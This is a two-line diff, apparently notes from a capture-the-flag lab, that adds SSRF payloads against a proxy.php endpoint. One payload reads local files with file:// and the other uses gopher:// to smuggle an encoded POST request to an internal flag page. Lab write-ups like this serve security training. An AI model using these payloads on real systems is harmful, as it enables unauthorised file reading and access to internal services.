@@ -1,0 +1,2 @@
+get source file: http://lab.splitline.tw:8891/proxy.php?url=file:///var/www/html/proxy.php
+get flag: http://lab.splitline.tw:8891/proxy.php?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:127.0.0.1%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250AContent-Length:%252014%250D%250A%250D%250Agivemeflag=yes
